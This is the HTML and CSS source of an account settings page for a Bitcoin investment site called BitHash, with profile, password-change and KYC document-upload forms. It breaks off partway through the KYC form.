<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BitHash | Account Settings</title>
    <meta name="description" content="Manage your BitHash account settings, security, and preferences">
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Rowdies:wght@300;400;700&family=Inter:wght@300;400;500;600;700&family=Manrope:wght@500;600;700&display=swap" rel="stylesheet">
    
    <!-- Favicon -->
    <link rel="icon" href="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" type="image/png">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- AOS Animation -->
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
    
    <style>
        :root {
            --primary: #00D395;
            --primary-dark: #00B783;
            --primary-light: #00E5A1;
            --secondary: #1E1E1E;
            --secondary-dark: #121212;
            --dark: #E5E5E5;
            --darker: #0A0A0A;
            --light: #121212;
            --lighter: #1E1E1E;
            --gray: #8E8E8E;
            --gray-light: #2E2E2E;
            --gray-lighter: #252525;
            --success: #00D395;
            --warning: #FFB800;
            --error: #FF3D57;
            --gold: #D4AF37;
            --gold-light: #FFD700;
            --gold-dark: #996515;
            --blue: #003366;
            --blue-dark: #002244;
            --blue-light: #004488;
            --purple: #784FED;
            --pink: #EC4899;
            --gradient: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            --gold-gradient: linear-gradient(135deg, var(--gold) 0%, var(--gold-light) 100%);
            --blue-gradient: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
            --border-radius: 8px;
            --border-radius-lg: 12px;
            --box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --box-shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.2), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-slow: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            --visa-blue: #1A1F71;
            --visa-gold: #F7B600;
            --security-blue: #1A73E8;
            --security-green: #34A853;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html {
            scroll-behavior: smooth;
            overflow-x: hidden;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            color: var(--dark);
            background-color: var(--light);
            line-height: 1.6;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        
        /* Bitcoin Logo Animation */
        @keyframes bitcoinFloat {
            0%, 100% {
                transform: translateY(0) rotate(0deg);
            }
            25% {
                transform: translateY(-20px) rotate(90deg);
            }
            50% {
                transform: translateY(0) rotate(180deg);
            }
            75% {
                transform: translateY(-10px) rotate(270deg);
            }
        }

        .bitcoin-animation {
            display: inline-block;
            animation: bitcoinFloat 4s ease-in-out infinite;
            margin-right: 5px;
            vertical-align: middle;
            color: var(--gold);
            text-shadow: 0 0 10px var(--gold-light);
            font-weight: bold;
            transform-origin: center;
        }

        /* Security Badge */
        .security-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--darker);
            padding: 12px 16px;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow-lg);
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.85rem;
            font-weight: 600;
            z-index: 100;
            border-left: 4px solid var(--security-green);
            color: var(--dark);
            border: 1px solid var(--gray-light);
        }
        
        .security-badge i {
            color: var(--security-green);
            font-size: 1rem;
        }
        
        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--darker);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }
        
        .loading-overlay.hidden {
            opacity: 0;
            visibility: hidden;
        }
        
        .loading-logo {
            width: 80px;
            height: 80px;
            animation: pulse 1.5s infinite ease-in-out;
            filter: drop-shadow(0 0 10px rgba(0, 211, 149, 0.3));
        }
        
        .loading-text {
            margin-top: 20px;
            font-weight: 500;
            color: var(--gray);
            font-size: 1rem;
        }
        
        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(0.95); opacity: 0.8; }
        }
        
        .container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        /* Enhanced Header Styles */
        header {
            background-color: var(--darker);
            box-shadow: var(--box-shadow);
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            padding: 8px 0;
            transition: var(--transition-slow);
            border-bottom: 1px solid var(--gray-light);
            height: 60px;
        }
        
        header.scrolled {
            background-color: rgba(10, 10, 10, 0.98);
            backdrop-filter: blur(5px);
        }
        
        .header-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            height: 100%;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            z-index: 1001;
        }
        
        .logo img {
            height: 32px;
            width: auto;
            transition: var(--transition);
        }
        
        .logo:hover img {
            transform: scale(1.05);
        }
        
        .logo-text {
            font-family: 'Rowdies', sans-serif;
            font-weight: 700;
            font-size: 1.3rem;
            color: var(--primary);
            background-clip: text;
            position: relative;
        }
        
        /* Auth Buttons */
        .auth-buttons {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .auth-buttons .btn {
            padding: 6px 12px;
            font-size: 0.85rem;
        }
        
        .user-balance {
            background-color: var(--primary);
            color: var(--darker);
            padding: 6px 12px;
            border-radius: var(--border-radius);
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 0.85rem;
        }
        
        .user-balance:hover {
            background-color: var(--primary-light);
            transform: translateY(-2px);
        }
        
        .user-balance i {
            font-size: 0.85rem;
        }
        
        /* Mobile Menu Toggle */
        .mobile-menu-toggle {
            display: none;
            background: none;
            border: none;
            color: var(--dark);
            font-size: 1.3rem;
            cursor: pointer;
            padding: 5px;
            z-index: 1001;
            transition: var(--transition);
            position: relative;
            width: 40px;
            height: 40px;
            justify-content: center;
            align-items: center;
        }
        
        .mobile-menu-toggle:hover {
            color: var(--primary);
        }
        
        .mobile-menu-toggle .hamburger {
            width: 24px;
            height: 2px;
            background: currentColor;
            position: relative;
            transition: var(--transition);
        }
        
        .mobile-menu-toggle .hamburger::before,
        .mobile-menu-toggle .hamburger::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 2px;
            background: currentColor;
            left: 0;
            transition: var(--transition);
        }
        
        .mobile-menu-toggle .hamburger::before {
            top: -8px;
        }
        
        .mobile-menu-toggle .hamburger::after {
            bottom: -8px;
        }
        
        .mobile-menu-toggle.active .hamburger {
            background: transparent;
        }
        
        .mobile-menu-toggle.active .hamburger::before {
            transform: translateY(8px) rotate(45deg);
        }
        
        .mobile-menu-toggle.active .hamburger::after {
            transform: translateY(-8px) rotate(-45deg);
        }
        
        /* Navigation */
        nav {
            transition: var(--transition-slow);
        }
        
        nav ul {
            display: flex;
            list-style: none;
            gap: 20px;
        }
        
        nav a {
            text-decoration: none;
            color: var(--dark);
            font-weight: 500;
            transition: var(--transition);
            position: relative;
            font-size: 0.9rem;
            padding: 3px 0;
        }
        
        nav a:hover {
            color: var(--primary);
        }
        
        nav a::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0;
            height: 2px;
            background: var(--primary);
            transition: var(--transition);
        }
        
        nav a:hover::after {
            width: 100%;
        }
        
        .btn {
            padding: 10px 20px;
            border-radius: var(--border-radius);
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            border: none;
            font-size: 0.9rem;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            white-space: nowrap;
        }
        
        .btn-primary {
            background: var(--gradient);
            color: var(--darker);
            box-shadow: 0 4px 15px rgba(0, 211, 149, 0.3);
        }
        
        .btn-primary:hover {
            background: linear-gradient(135deg, var(--primary-light) 0%, var(--primary) 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 211, 149, 0.4);
        }
        
        .btn-outline {
            background-color: transparent;
            color: var(--primary);
            border: 1px solid var(--primary);
        }
        
        .btn-outline:hover {
            background: var(--primary);
            color: var(--darker);
            transform: translateY(-2px);
        }
        
        .btn-gold {
            background: var(--gold-gradient);
            color: var(--darker);
            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
        }
        
        .btn-gold:hover {
            background: linear-gradient(135deg, var(--gold-light) 0%, var(--gold) 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(212, 175, 55, 0.4);
        }
        
        /* Notification System */
        .notification-center {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            width: 100%;
            max-width: 400px;
        }
        
        .notification {
            width: 100%;
            padding: 16px 20px;
            border-radius: var(--border-radius-lg);
            box-shadow: var(--box-shadow-lg);
            display: flex;
            align-items: center;
            gap: 12px;
            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            transform: translateY(30px) scale(0.95);
            opacity: 0;
            margin-bottom: 10px;
            font-size: 0.85rem;
            font-weight: 500;
            backdrop-filter: blur(10px);
            background-color: rgba(30, 30, 30, 0.95);
            border: 1px solid rgba(255, 255, 255, 0.1);
            pointer-events: auto;
            position: relative;
        }
        
        .notification.show {
            transform: translateY(0) scale(1);
            opacity: 1;
        }
        
        .notification.error {
            background-color: rgba(255, 61, 87, 0.95);
            color: white;
            border-left: 4px solid #cc2c4d;
        }
        
        .notification.success {
            background-color: rgba(0, 211, 149, 0.95);
            color: var(--darker);
            border-left: 4px solid #00B783;
        }
        
        .notification i {
            font-size: 1.4rem;
            flex-shrink: 0;
        }
        
        .notification-content {
            flex: 1;
            padding-right: 10px;
        }
        
        .notification-title {
            font-weight: 600;
            margin-bottom: 4px;
            font-size: 0.95rem;
        }
        
        .notification-message {
            font-size: 0.85rem;
            line-height: 1.4;
        }
        
        .notification-close {
            position: absolute;
            top: 8px;
            right: 8px;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background-color: rgba(0, 0, 0, 0.1);
            cursor: pointer;
            transition: var(--transition);
            font-size: 0.9rem;
        }
        
        .notification-close:hover {
            background-color: rgba(0, 0, 0, 0.2);
            transform: rotate(90deg);
        }
        
        @keyframes shake {
            10%, 90% { transform: translate3d(-1px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        
        .notification.error.show {
            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
        }
        
        /* Account Settings Layout */
        .account-settings-section {
            padding: 140px 0 60px;
            background-color: var(--light);
        }
        
        .account-settings-container {
            display: grid;
            grid-template-columns: 280px 1fr;
            gap: 30px;
        }
        
        .settings-sidebar {
            background-color: var(--lighter);
            border-radius: var(--border-radius-lg);
            padding: 30px;
            height: fit-content;
            position: sticky;
            top: 100px;
        }
        
        .settings-sidebar-title {
            font-size: 1.2rem;
            margin-bottom: 25px;
            color: var(--dark);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .settings-sidebar-title i {
            color: var(--primary);
        }
        
        .settings-menu {
            list-style: none;
        }
        
        .settings-menu li {
            margin-bottom: 5px;
        }
        
        .settings-menu a {
            display: block;
            padding: 10px 15px;
            color: var(--gray);
            text-decoration: none;
            border-radius: var(--border-radius);
            transition: var(--transition);
            font-weight: 500;
        }
        
        .settings-menu a:hover, .settings-menu a.active {
            background-color: var(--gray-light);
            color: var(--dark);
        }
        
        .settings-menu a i {
            width: 20px;
            text-align: center;
            margin-right: 10px;
        }
        
        .settings-content {
            background-color: var(--lighter);
            border-radius: var(--border-radius-lg);
            padding: 40px;
        }
        
        .settings-section {
            margin-bottom: 40px;
            display: none;
        }
        
        .settings-section.active {
            display: block;
        }
        
        .settings-section-title {
            font-size: 1.5rem;
            margin-bottom: 25px;
            color: var(--dark);
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .settings-section-title i {
            color: var(--primary);
            font-size: 1.2rem;
        }
        
        .settings-card {
            background-color: var(--light);
            border-radius: var(--border-radius-lg);
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid var(--gray-light);
        }
        
        .settings-card-title {
            font-size: 1.2rem;
            margin-bottom: 20px;
            color: var(--dark);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .settings-card-title i {
            color: var(--primary);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--dark);
        }
        
        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid var(--gray-light);
            border-radius: var(--border-radius);
            font-size: 1rem;
            transition: var(--transition);
            background-color: var(--light);
            color: var(--dark);
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(0, 211, 149, 0.2);
        }
        
        .form-row {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
        }
        
        .form-actions {
            display: flex;
            justify-content: flex-end;
            gap: 15px;
            margin-top: 30px;
        }
        
        .verification-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 500;
            margin-left: 15px;
        }
        
        .verification-badge.verified {
            background-color: rgba(0, 211, 149, 0.1);
            color: var(--success);
        }
        
        .verification-badge.pending {
            background-color: rgba(255, 184, 0, 0.1);
            color: var(--warning);
        }
        
        .verification-badge.unverified {
            background-color: rgba(255, 61, 87, 0.1);
            color: var(--error);
        }
        
        /* KYC Document Upload */
        .document-upload-area {
            border: 2px dashed var(--gray-light);
            border-radius: var(--border-radius);
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: var(--transition);
            margin-bottom: 20px;
        }
        
        .document-upload-area:hover {
            border-color: var(--primary);
        }
        
        .document-upload-area i {
            font-size: 2rem;
            color: var(--primary);
            margin-bottom: 10px;
        }
        
        .document-upload-area p {
            color: var(--gray);
            margin-bottom: 5px;
        }
        
        .document-upload-area small {
            color: var(--gray);
            font-size: 0.8rem;
        }
        
        .document-preview {
            display: none;
            margin-top: 20px;
            text-align: center;
        }
        
        .document-preview img {
            max-width: 100%;
            max-height: 300px;
            border-radius: var(--border-radius);
            border: 1px solid var(--gray-light);
        }
        
        .document-preview video {
            max-width: 100%;
            max-height: 400px;
            border-radius: var(--border-radius);
            border: 1px solid var(--gray-light);
        }
        
        /* Webcam Verification */
        .webcam-container {
            width: 100%;
            max-width: 500px;
            margin: 20px 0;
            border-radius: var(--border-radius);
            overflow: hidden;
            position: relative;
            display: none;
        }
        
        #webcam-video {
            width: 100%;
            height: auto;
            display: block;
            background-color: var(--gray-light);
        }
        
        .webcam-controls {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }
        
        .capture-btn {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background-color: var(--primary);
            border: none;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: var(--transition);
        }
        
        .capture-btn:hover {
            background-color: var(--primary-dark);
            transform: scale(1.05);
        }
        
        .capture-btn i {
            color: white;
            font-size: 1.5rem;
        }
        
        .video-instructions {
            background-color: rgba(0, 211, 149, 0.1);
            border-left: 4px solid var(--primary);
            padding: 15px;
            margin: 20px 0;
            border-radius: var(--border-radius);
        }
        
        .video-instructions h4 {
            color: var(--primary);
            margin-bottom: 10px;
        }
        
        .video-instructions ol {
            padding-left: 20px;
        }
        
        .video-instructions li {
            margin-bottom: 8px;
            color: var(--gray);
        }
        
        /* Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            opacity: 0;
            visibility: hidden;
            transition: var(--transition-slow);
            backdrop-filter: blur(5px);
            padding: 15px;
        }
        
        .modal-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        
        .modal-container {
            background-color: var(--lighter);
            border-radius: var(--border-radius-lg);
            width: 100%;
            max-width: 400px;
            max-height: 85vh;
            overflow-y: auto;
            transform: translateY(20px);
            transition: var(--transition-slow);
            box-shadow: var(--box-shadow-lg);
            border: 1px solid var(--gray-light);
            position: relative;
        }
        
        .modal-overlay.active .modal-container {
            transform: translateY(0);
        }
        
        .modal-header {
            padding: 16px 20px;
            border-bottom: 1px solid var(--gray-light);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: var(--lighter);
            border-radius: var(--border-radius-lg) var(--border-radius-lg) 0 0;
        }
        
        .modal-title {
            font-size: 1.1rem;
            color: var(--dark);
            font-weight: 600;
        }
        
        .modal-close {
            background: none;
            border: none;
            color: var(--gray);
            font-size: 1.2rem;
            cursor: pointer;
            transition: var(--transition);
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .modal-close:hover {
            background-color: rgba(255, 255, 255, 0.1);
            color: var(--dark);
        }
        
        .modal-body {
            padding: 20px;
        }
        
        .modal-footer {
            padding: 16px 20px;
            border-top: 1px solid var(--gray-light);
            display: flex;
            justify-content: flex-end;
            gap: 12px;
            background-color: var(--secondary-dark);
            border-radius: 0 0 var(--border-radius-lg) var(--border-radius-lg);
        }
        
        /* Footer */
        footer {
            background-color: var(--darker);
            color: white;
            padding: 50px 0 20px;
        }
        
        .footer-container {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 30px;
            margin-bottom: 30px;
        }
        
        .footer-logo {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 15px;
        }
        
        .footer-logo img {
            height: 28px;
            width: auto;
        }
        
        .footer-logo-text {
            font-family: 'Rowdies', sans-serif;
            font-weight: 700;
            font-size: 1.1rem;
            color: var(--primary);
        }
        
        .footer-about p {
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.9rem;
            margin-bottom: 15px;
            line-height: 1.6;
        }
        
        .footer-social {
            display: flex;
            gap: 10px;
        }
        
        .social-icon {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: var(--transition);
            color: white;
        }
        
        .social-icon.twitter {
            background-color: #1DA1F2;
        }
        
        .social-icon.linkedin {
            background-color: #0077B5;
        }
        
        .social-icon.facebook {
            background-color: #1877F2;
        }
        
        .social-icon.instagram {
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);
        }
        
        .social-icon:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        
        .footer-title {
            font-weight: 700;
            margin-bottom: 15px;
            font-size: 1.1rem;
            color: white;
        }
        
        .footer-links ul {
            list-style: none;
        }
        
        .footer-links li {
            margin-bottom: 10px;
        }
        
        .footer-links a {
            color: rgba(255, 255, 255, 0.7);
            text-decoration: none;
            transition: var(--transition);
            font-size: 0.9rem;
            display: inline-block;
        }
        
        .footer-links a:hover {
            color: var(--primary);
            transform: translateX(3px);
        }
        
        .footer-contact p {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 12px;
            font-size: 0.9rem;
            line-height: 1.5;
        }
        
        .footer-contact i {
            color: var(--primary);
            width: 18px;
            text-align: center;
            margin-top: 2px;
            font-size: 0.9rem;
        }
        
        .footer-bottom {
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            padding-top: 20px;
            text-align: center;
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.8rem;
        }
        
        /* Responsive Styles */
        @media (max-width: 1024px) {
            .account-settings-container {
                grid-template-columns: 240px 1fr;
            }
            
            .form-row {
                grid-template-columns: 1fr;
            }
        }
        
        @media (max-width: 768px) {
            .account-settings-section {
                padding: 120px 0 40px;
            }
            
            .account-settings-container {
                grid-template-columns: 1fr;
            }
            
            .settings-sidebar {
                position: static;
                margin-bottom: 30px;
            }
            
            .settings-menu {
                display: flex;
                flex-wrap: wrap;
                gap: 5px;
            }
            
            .settings-menu li {
                margin-bottom: 0;
            }
            
            .settings-menu a {
                padding: 8px 12px;
                font-size: 0.85rem;
            }
            
            .settings-content {
                padding: 30px;
            }
            
            /* Mobile Navigation */
            .mobile-menu-toggle {
                display: flex;
            }
            
            nav {
                position: fixed;
                top: 60px;
                left: 0;
                width: 100%;
                background-color: var(--darker);
                padding: 20px;
                box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.2);
                transform: translateY(-100%);
                opacity: 0;
                visibility: hidden;
                transition: var(--transition-slow);
                z-index: 999;
            }
            
            nav.active {
                transform: translateY(0);
                opacity: 1;
                visibility: visible;
            }
            
            nav ul {
                flex-direction: column;
                gap: 15px;
            }
            
            nav a {
                padding: 10px 0;
                font-size: 1rem;
            }
        }
        
        @media (max-width: 480px) {
            .account-settings-section {
                padding: 100px 0 30px;
            }
            
            .settings-sidebar {
                padding: 20px;
            }
            
            .settings-content {
                padding: 20px;
            }
            
            .settings-section-title {
                font-size: 1.3rem;
            }
            
            .settings-card {
                padding: 20px;
            }
            
            .form-actions {
                flex-direction: column;
                gap: 10px;
            }
            
            .btn {
                width: 100%;
            }
            
            .logo-text {
                font-size: 1.1rem;
            }
            
            .auth-buttons {
                gap: 8px;
            }
            
            .auth-buttons .btn {
                padding: 5px 10px;
                font-size: 0.8rem;
            }
            
            .user-balance {
                padding: 5px 10px;
                font-size: 0.8rem;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loading-overlay">
        <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo" class="loading-logo">    
        <div class="loading-text">Establishing Secure Connection</div>
    </div>

    <!-- Security Badge -->
    <div class="security-badge">
        <i class="fas fa-shield-alt"></i>
        <span>256-bit AES & TLS 1.3 Encrypted</span>
    </div>

    <!-- Notification System -->
    <div class="notification-center" id="notification-center"></div>

    <!-- Header -->
    <header id="main-header">
        <div class="container header-container">
            <div class="logo" onclick="window.location.href='index.html'">
                <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo">
                <span class="logo-text">
                    <span class="bitcoin-animation">₿</span>itHash
                </span>
            </div>
            
            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle navigation">
                <span class="hamburger"></span>
            </button>
            
            <nav id="main-nav">
                <ul>
                    <li><a href="index.html">Home</a></li>
                    <li><a href="index.html#plans">Investment Plans</a></li>
                    <li><a href="index.html#how-it-works">How It Works</a></li>
                    <li><a href="dashboard.html">Dashboard</a></li>
                    <li><a href="accountsetting.html" class="active">Settings</a></li>
                </ul>
            </nav>
            
            <div class="auth-buttons" id="auth-buttons" style="display: none;">
                <button class="btn btn-outline" onclick="window.location.href='login.html'">Login</button>
                <button class="btn btn-primary" onclick="window.location.href='signup.html'">Sign Up</button>
            </div>
            
            <div class="user-balance" id="user-balance" onclick="window.location.href='dashboard.html'">
                <i class="fas fa-wallet"></i>
                <span id="balance-amount">$0.00</span>
                <div class="logout-dropdown" id="logout-dropdown" style="display: none;">
                    <button class="btn btn-outline" onclick="logout()" style="margin-left: 10px; padding: 5px 10px; font-size: 0.8rem;">
                        <i class="fas fa-sign-out-alt"></i> Logout
                    </button>
                </div>
            </div>
        </div>
    </header>

    <!-- Account Settings Section -->
    <section class="account-settings-section">
        <div class="container account-settings-container">
            <!-- Settings Sidebar -->
            <div class="settings-sidebar">
                <h2 class="settings-sidebar-title">
                    <i class="fas fa-user-cog"></i> Account Settings
                </h2>
                <ul class="settings-menu">
                    <li><a href="#profile" class="active"><i class="fas fa-user"></i> Profile</a></li>
                    <li><a href="#security"><i class="fas fa-shield-alt"></i> Security</a></li>
                    <li><a href="#kyc"><i class="fas fa-id-card"></i> KYC Verification</a></li>
                    <li><a href="#notifications"><i class="fas fa-bell"></i> Notifications</a></li>
                    <li><a href="#api"><i class="fas fa-key"></i> API Keys</a></li>
                </ul>
            </div>
            
            <!-- Settings Content -->
            <div class="settings-content">
                <!-- Profile Section -->
                <div class="settings-section active" id="profile-section">
                    <h2 class="settings-section-title">
                        <i class="fas fa-user"></i> Profile Information
                    </h2>
                    
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-id-badge"></i> Personal Details
                        </h3>
                        
                        <form id="profile-form">
                            <div class="form-row">
                                <div class="form-group">
                                    <label for="first-name" class="form-label">First Name</label>
                                    <input type="text" id="first-name" class="form-control" required>
                                </div>
                                <div class="form-group">
                                    <label for="last-name" class="form-label">Last Name</label>
                                    <input type="text" id="last-name" class="form-control" required>
                                </div>
                            </div>
                            
                            <div class="form-group">
                                <label for="email" class="form-label">Email Address</label>
                                <input type="email" id="email" class="form-control" required readonly>
                            </div>
                            
                            <div class="form-group">
                                <label for="phone" class="form-label">Phone Number</label>
                                <input type="tel" id="phone" class="form-control" required>
                            </div>
                            
                            <div class="form-group">
                                <label for="country" class="form-label">Country</label>
                                <input type="text" id="country" class="form-control" required>
                            </div>
                            
                            <div class="form-actions">
                                <button type="button" class="btn btn-outline">Cancel</button>
                                <button type="submit" class="btn btn-primary" id="save-profile-btn">Save Changes</button>
                            </div>
                        </form>
                    </div>
                </div>
                
                <!-- Security Section -->
                <div class="settings-section" id="security-section">
                    <h2 class="settings-section-title">
                        <i class="fas fa-shield-alt"></i> Security Settings
                    </h2>
                    
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-key"></i> Change Password
                        </h3>
                        
                        <form id="password-form">
                            <div class="form-group">
                                <label for="current-password" class="form-label">Current Password</label>
                                <input type="password" id="current-password" class="form-control" required>
                            </div>
                            
                            <div class="form-group">
                                <label for="new-password" class="form-label">New Password</label>
                                <input type="password" id="new-password" class="form-control" required>
                            </div>
                            
                            <div class="form-group">
                                <label for="confirm-password" class="form-label">Confirm New Password</label>
                                <input type="password" id="confirm-password" class="form-control" required>
                            </div>
                            
                            <div class="form-actions">
                                <button type="button" class="btn btn-outline">Cancel</button>
                                <button type="submit" class="btn btn-primary" id="change-password-btn">Change Password</button>
                            </div>
                        </form>
                    </div>
                </div>
                
                <!-- KYC Verification Section -->
                <div class="settings-section" id="kyc-section">
                    <h2 class="settings-section-title">
                        <i class="fas fa-id-card"></i> KYC Verification
                    </h2>
                    
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-user-check"></i> Identity Verification
                            <span class="verification-badge" id="identity-verification-badge">
                                <i class="fas fa-times-circle"></i> Unverified
                            </span>
                        </h3>
                        
                        <p style="margin-bottom: 20px; color: var(--gray);">
                            To comply with financial regulations, we require identity verification for all accounts. 
                            This helps prevent fraud and keeps our platform secure.
                        </p>
                        
                        <div class="form-row">
                            <div class="form-group">
                                <label class="form-label">Document Type</label>
                                <select class="form-control" id="document-type">
                                    <option value="">Select document type</option>
                                    <option value="passport">Passport</option>
                                    <option value="drivers_license">Driver's License</option>
                                    <option value="national_id">National ID</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label class="form-label">Document Number</label>
                                <input type="text" class="form-control" id="document-number" placeholder="Enter document number">
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Expiration Date</label>
                            <input type="date" class="form-control" id="document-expiry">
                        </div>
                        
                        <!-- Front Side Upload -->
                        <div class="form-group">
                            <label class="form-label">Document Front Side</label>
                            <div class="document-upload-area" id="front-document-upload">
                                <i class="fas fa-cloud-upload-alt"></i>
                                <p>Upload front side of your document</p>
                                <small>Supported formats: JPG, PNG, PDF (Max 5MB)</small>
                                <input type="file" id="front-document-file" accept="image/*,.pdf" style="display: none;">
                            </div>
                            <div class="document-preview" id="front-document-preview">
                                <img id="front-document-preview-image" src="" alt="Front Document Preview">
                                <button type="button" class="btn btn-outline" style="margin-top: 10px;" onclick="removeDocument('front')">
                                    <i class="fas fa-trash"></i> Remove
                                </button>
                            </div>
                        </div>
                        
                        <!-- Back Side Upload -->
                        <div class="form-group">
                            <label class="form-label">Document Back Side</label>
                            <div class="document-upload-area" id="back-document-upload">
                                <i class="fas fa-cloud-upload-alt"></i>
                                <p>Upload back side of your document</p>
                                <small>Supported formats: JPG, PNG, PDF (Max 5MB)</small>
                                <input type="file" id="back-document-file" accept="image/*,.pdf" style="display: none;">
                            </div>
                            <div class="document-preview" id="back-document-preview">
                                <img id="back-document-preview-image" src="" alt="Back Document Preview">
                                <button type="button" class="btn btn-outline" style="margin-top: 10px;" onclick="removeDocument('back')">
                                    <i class="fas fa-trash"></i> Remove
                                </button>
                            </div>
                        </div>
                        
                        <div class="form-actions">
                            <button type="button" class="btn btn-outline" id="cancel-document-btn">Cancel</button>
